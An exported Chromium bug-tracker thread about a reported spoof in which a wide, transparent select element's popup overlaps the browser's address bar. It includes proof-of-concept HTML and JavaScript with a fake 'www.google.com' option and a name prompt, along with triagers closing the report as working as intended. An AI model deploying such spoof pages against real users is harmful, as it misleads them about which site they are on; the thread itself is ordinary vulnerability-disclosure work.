@@ -1,0 +1,173 @@
+Issue ID: 347268862
+
+Author: ch...@google.com
+Dear team no need for Fullscreen. I comment in #2 poc for that. The extended poc given below<br>&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;<br><br>&lt;head&gt;<br>  &lt;title&gt;Title of the document&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;style&gt;<br>  body {<br>    margin: 0;<br>    padding: 0;<br>    overflow-x: hidden;<br>    overflow-y: hidden;<br>  }<br><br>  select {<br>    margin-top: 1%;<br>    height: 89%;<br>    width: 9999px;<br><br>    background-color: transparent;<br>    border: none;<br>    color: black;<br>    font-size: 18px;<br>    outline: none;<br><br>    -webkit-appearance: none;<br>    -moz-appearance: none;<br>    appearance: none;<br><br>    cursor: pointer;<br>  }<br><br>  select::-ms-expand {<br>    display: none;<br>  }<br>&lt;/style&gt;<br><br>&lt;select id=&quot;selectElement&quot;&gt;<br>  &lt;option id=&quot;spoofText&quot; value=&quot;fake&quot; selected&gt;<a href="http://www.google.com" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="http://www.google.com" data-b-redirected-href="http://www.google.com">www.google.com</a>&lt;/option&gt;<br>  &lt;option value=&quot;1&quot;&gt;&lt;/option&gt;<br>  &lt;option value=&quot;2&quot;&gt;&lt;/option&gt;<br>  &lt;option value=&quot;3&quot;&gt;&lt;/option&gt;<br>  &lt;option value=&quot;4&quot;&gt;&lt;/option&gt;<br>&lt;/select&gt;<br><br>&lt;script&gt;<br>  const select = document.getElementById(&quot;selectElement&quot;);<br>  let previousIndex = select.selectedIndex;<br>  let hasInteracted = false;<br><br>  select.addEventListener(&quot;click&quot;, function () {<br>    if (!hasInteracted) {<br>      hasInteracted = true;<br>      return;<br>    }<br><br>    if (select.selectedIndex === previousIndex &amp;&amp; select.value === &quot;fake&quot;) {<br>      const name = prompt(&quot;Enter your name:&quot;);<br>      if (name) {<br>        alert(&quot;Hello, &quot; + name + &quot;!&quot;);<br>      }<br>      select.selectedIndex = 1;<br>      previousIndex = select.selectedIndex;<br>    }<br>  });<br><br>  select.addEventListener(&quot;change&quot;, function () {<br>    if (!hasInteracted) {<br>      hasInteracted = true;<br>      return;<br>    }<br><br>    if (this.value === &quot;fake&quot;) {<br>      const name = prompt(&quot;Enter your name:&quot;);<br>      if (name) {<br>        alert(&quot;Hello, &quot; + name + &quot;!&quot;);<br>      }<br>      this.selectedIndex = 1;<br>      previousIndex = this.selectedIndex;<br>    } else {<br>      previousIndex = this.selectedIndex;<br>    }<br>  });<br>&lt;/script&gt;<br>
+
+Author: ch...@google.com
+<h1>Steps to reproduce the problem</h1>
+<p>Load html
+Click fake omnibox</p>
+<h1>Problem Description</h1>
+<p>Select option can hide omnibox</p>
+<div>&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;
+</div><div>&lt;head&gt;
+    &lt;title&gt;Title of the document&lt;/title&gt;
+&lt;/head&gt;
+&lt;style&gt;
+    body {
+        margin: 0;
+        padding: 0;
+        overflow-x: hidden;
+        overflow-y: hidden;
+    }
+</div>
+<pre><code>select {
+    margin-top: 1%;
+    height: 89%;
+    width: 9999px;
+}
+</code></pre>
+<div>&lt;/style&gt;
+&lt;script&gt;
+</div>
+<pre><code>var w = null;
+function spoof() {
+    document.documentElement.requestFullscreen();
+
+}
+</code></pre>
+<div>&lt;/script&gt;
+</div><div>&lt;select id=&quot;selectElement&quot;&gt;
+</div>
+<pre><code>&lt;option onclick=&quot;document.documentElement.requestFullscreen();&quot; id=&quot;spoofText&quot;&gt;&lt;/option&gt;
+&lt;option selected&gt; &lt;/option&gt;
+&lt;option selected&gt; &lt;/option&gt;
+&lt;option selected&gt; &lt;/option&gt;
+&lt;option selected&gt;&lt;/option&gt;
+&lt;option selected&gt;&lt;/option&gt;
+&lt;option selected&gt;&lt;/option&gt;
+&lt;option selected&gt;Fake Omni bar&lt;/option&gt;
+</code></pre>
+<div>&lt;/select&gt;
+</div>
+<h1>Additional Comments</h1>
+<p>Version 126.0.6478.62 (Official Build) (64-bit)
+Version 128.0.6535.2 (Official Build) dev (64-bit)
+Version 127.0.6533.5 (Official Build) beta (64-bit)</p>
+<h1>Summary</h1>
+<p>Select option can hide omnibox</p>
+<h1>Additional Data</h1>
+<p>Category: Security <br>
+Chrome Channel: Not sure <br>
+Regression: N/A</p>
+
+Author: ch...@google.com
+google_domain
+
+Author: li...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.CustomFieldValue
+
+Author: li...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: li...@gmail.com
+public_non_google
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+public_non_google
+
+Author: pe...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: pe...@google.com
+google_domain
+
+Author: li...@gmail.com
+&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;<br><br>&lt;head&gt;<br>    &lt;title&gt;Title of the document&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;style&gt;<br>    body {<br>        margin: 0;<br>        padding: 0;<br>        overflow-x: hidden;<br>        overflow-y: hidden;<br>    }<br><br>    select {<br>        margin-top: 1%;<br>        height: 89%;<br>        width: 9999px;<br>    }<br>&lt;/style&gt;<br><br>&lt;select id=&quot;selectElement&quot;&gt;<br><br>    &lt;option id=&quot;spoofText&quot;&gt;&lt;/option&gt;<br>    &lt;option selected&gt; &lt;/option&gt;<br>    &lt;option selected&gt; &lt;/option&gt;<br>    &lt;option selected&gt; &lt;/option&gt;<br>    &lt;option selected&gt;&lt;/option&gt;<br>    &lt;option selected&gt;&lt;/option&gt;<br>    &lt;option selected&gt;&lt;/option&gt;<br>    &lt;option selected&gt;Fake Omni bar&lt;/option&gt;<br>&lt;/select&gt;
+
+Author: nobody@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.CustomFieldValue
+
+Author: nobody@google.com
+[Deleted User]
+
+Author: nobody@google.com
+type.googleapis.com/google.protobuf.StringValue
+
+Author: pe...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.CustomFieldValue
+
+Author: nobody@google.com
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: nobody@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: nobody@google.com
+<p>I was able to reproduce this on Windows and Linux but not on macOS. It requires the window being fullscreen to reproduce.</p>
+
+Author: ja...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: ja...@chromium.org
+public_non_google
+
+Author: nobody@google.com
+<p>jarhar, can you find an appropriate owner for this bug?</p>
+
+Author: li...@gmail.com
+WVdVNU5UazJZbVJrWkRObE5UUmtZV1ZrWWpCaU4yUTJZamsxTlRJMVpXRT0=
+
+Author: ja...@chromium.org
+<p>I believe that select popups should be allowed to escape the windows bounds and therefore go over the omnibox, and now that we require user activation in order to open a select popup, I don&#39;t think that the popup will really be able to persistently cover the omnibox if the user tries to click elsewhere to close the popup.</p>
+<p>I&#39;m inclined to WontFix this bug. I&#39;m not sure how I would find a way to let the popup leave the web contents but not go over the omnibar.</p>
+
+Author: li...@gmail.com
+Dear Team,<br><br>Please look through this bugs and assignees<br><br><a href="https://www.google.com/url?q=https://issues.chromium.org/issues/40064274&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2kyZJ7uUNFHJc28qnF45pI" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="https://issues.chromium.org/issues/40064274" data-b-redirected-href="https://www.google.com/url?q=https://issues.chromium.org/issues/40064274&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2kyZJ7uUNFHJc28qnF45pI">https://issues.chromium.org/issues/40064274</a><br><a href="https://www.google.com/url?q=https://issues.chromium.org/issues/41494315&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1zUEqd6OleJ_Va6fcxFPcu" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="https://issues.chromium.org/issues/41494315" data-b-redirected-href="https://www.google.com/url?q=https://issues.chromium.org/issues/41494315&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1zUEqd6OleJ_Va6fcxFPcu">https://issues.chromium.org/issues/41494315</a>
+
+Author: li...@gmail.com
+T0dJMU9UbGtZMkk0TjJFeU1UTXhOV1JpWkdNek56bGtNbU5pWldZM05qYz0=
+
+Author: ad...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: ad...@google.com
+google_domain
+
+Author: li...@gmail.com
+Dear Team,<br><br>This is another mode of hide omnibox like <a href="https://www.google.com/url?q=https://issues.chromium.org/329476341&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3B4WNjWLP5i5AypZaiA9iz" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="https://issues.chromium.org/329476341" data-b-redirected-href="https://www.google.com/url?q=https://issues.chromium.org/329476341&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3B4WNjWLP5i5AypZaiA9iz">https://issues.chromium.org/329476341</a> Text Selection menu able to overlap URL bar  so make sure as per that issues severity and priority.<br><br>tks
+
+Author: am...@chromium.org
+<p>The conditions and spoofs demonstrated in each linked bug is far different than issue presented here.
+In this case, the user has to be in fullscreen mode for this selection panel to be displayed over the omnibox. It would also be very apparent to the user that this is not an omnibox. There is no URL / domain spoofing occurring. This selection pop-up will also not be able to be persistently maintained to allow for any sort of security consequences to a user.</p>
+<p>This in concurrence with c#6, we&#39;ll need to go ahead and close this report as WAI. If you can demonstrate this where fullscreen mode is not required, the option selection is able to be more persistently set over the omnibox in a way a convincing spoof could be achieved, please go ahead and file a new report of this issue with that information and a updated testcase / demonstration.</p>
+
+Author: am...@chromium.org
+public_non_google
+
+Author: am...@chromium.org
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: li...@gmail.com
+Dear team no need for Fullscreen. I comment in #2 poc for that. The extended poc given below<br>&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;<br><br>&lt;head&gt;<br>  &lt;title&gt;Title of the document&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;style&gt;<br>  body {<br>    margin: 0;<br>    padding: 0;<br>    overflow-x: hidden;<br>    overflow-y: hidden;<br>  }<br><br>  select {<br>    margin-top: 1%;<br>    height: 89%;<br>    width: 9999px;<br><br>    background-color: transparent;<br>    border: none;<br>    color: black;<br>    font-size: 18px;<br>    outline: none;<br><br>    -webkit-appearance: none;<br>    -moz-appearance: none;<br>    appearance: none;<br><br>    cursor: pointer;<br>  }<br><br>  select::-ms-expand {<br>    display: none;<br>  }<br>&lt;/style&gt;<br><br>&lt;select id=&quot;selectElement&quot;&gt;<br>  &lt;option id=&quot;spoofText&quot; value=&quot;fake&quot; selected&gt;<a href="http://www.google.com" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="http://www.google.com" data-b-redirected-href="http://www.google.com">www.google.com</a>&lt;/option&gt;<br>  &lt;option value=&quot;1&quot;&gt;&lt;/option&gt;<br>  &lt;option value=&quot;2&quot;&gt;&lt;/option&gt;<br>  &lt;option value=&quot;3&quot;&gt;&lt;/option&gt;<br>  &lt;option value=&quot;4&quot;&gt;&lt;/option&gt;<br>&lt;/select&gt;<br><br>&lt;script&gt;<br>  const select = document.getElementById(&quot;selectElement&quot;);<br>  let previousIndex = select.selectedIndex;<br>  let hasInteracted = false;<br><br>  select.addEventListener(&quot;click&quot;, function () {<br>    if (!hasInteracted) {<br>      hasInteracted = true;<br>      return;<br>    }<br><br>    if (select.selectedIndex === previousIndex &amp;&amp; select.value === &quot;fake&quot;) {<br>      const name = prompt(&quot;Enter your name:&quot;);<br>      if (name) {<br>        alert(&quot;Hello, &quot; + name + &quot;!&quot;);<br>      }<br>      select.selectedIndex = 1;<br>      previousIndex = select.selectedIndex;<br>    }<br>  });<br><br>  select.addEventListener(&quot;change&quot;, function () {<br>    if (!hasInteracted) {<br>      hasInteracted = true;<br>      return;<br>    }<br><br>    if (this.value === &quot;fake&quot;) {<br>      const name = prompt(&quot;Enter your name:&quot;);<br>      if (name) {<br>        alert(&quot;Hello, &quot; + name + &quot;!&quot;);<br>      }<br>      this.selectedIndex = 1;<br>      previousIndex = this.selectedIndex;<br>    } else {<br>      previousIndex = this.selectedIndex;<br>    }<br>  });<br>&lt;/script&gt;<br>
+
+Author: ja...@chromium.org
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: aj...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: aj...@google.com
+googlers_unrestricted
+
+Author: aj...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
+
+Author: aj...@google.com
+TnprMk5EUTNPV1F6TUdOak5XWmtNV1ZqTkdVMk16azJNelE0WWpNNU4yVT0=
